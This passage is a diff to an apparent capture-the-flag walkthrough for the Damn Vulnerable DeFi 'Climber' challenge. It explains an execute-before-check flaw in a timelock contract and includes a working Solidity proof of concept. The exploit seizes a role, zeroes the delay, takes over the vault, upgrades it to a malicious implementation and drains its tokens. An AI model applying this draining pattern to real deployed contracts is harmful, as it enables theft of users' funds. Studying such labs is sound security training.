@@ -670,6 +670,83 @@ Run `forge test --mp test/backdoor/Backdoor.t.sol --isolate` to validate test
 
 ---
 
+## 12.CLIMBER
+
+**Objective**
+
+_from `_isSolved()` in test_
+
+1. _All tokens of the vault were deposited into the recovery account_
+
+**Attack Analysis**
+
+- The vulnerability resides in the `ClimberTimelock.execute()` function, whihc has an incorrect order of operations. It executes the actions before performing the necessary checks, instead of checking first and then executing. This allows an attacker to bypass the checks and directly modify the contract's state.
+- For an attacker to exploit this vulnerability, they have to follow the below steps:
+  1. Call grantRole to acquire the `PROPOSER_ROLE`.
+  2. Update `ClimberTimelock.delay` to 0.
+  3. Transfer ownership of `ClimberVault`to the attacker.
+  4. Call `ClimberTimelock.schedule()` to schedule the malicious operation.
+  5. Upgrade the contract with a new vulnerable instance.
+  6. Withdraw the funds using the new instance.
+- The exploit leverages the fact that the intended payload can be placed in the first few items of the array, and the last item can simply execute `ClimberTimelock.schedule()` to update the state, bypassing the checks in `ClimberTimelockBase.getOperationState()`.
+
+**POC**
+
+See [test/climber/Climber.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/climber/Climber.t.sol)
+
+```solidity
+function test_climber() public checkSolvedByPlayer {
+    Attack attackVault = new Attack(payable(timelock), address(vault));
+    attackVault.exploit();
+    VulnClimberVault newVaultImpl = new VulnClimberVault();
+    vault.upgradeToAndCall(address(newVaultImpl), "");
+    VulnClimberVault(address(vault)).withdrawAll(address(token), recovery);
+}
+
+contract Attack {
+    address payable private immutable timelock;
+
+    uint256[] private _values = [0, 0, 0, 0];
+    address[] private _targets = new address[](4);
+    bytes[] private _elements = new bytes[](4);
+
+    constructor(address payable _timelock, address _vault) {
+        timelock = _timelock;
+        _targets = [_timelock, _timelock, _vault, address(this)];
+
+        _elements[0] = (
+            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
+        );
+        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
+        _elements[3] = abi.encodeWithSignature("schedule()");
+    }
+
+    function exploit() external {
+        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
+    }
+
+    function schedule() external {
+        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
+    }
+}
+
+contract VulnClimberVault is ClimberVault {
+    constructor() {
+        _disableInitializers();
+    }
+
+    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
+    }
+}
+```
+
+Run `forge test --mp test/climber/Climber.t.sol --isolate` to validate test
+
+---
+
 ## 14.PUPPET V3
 
 **Obejctive**
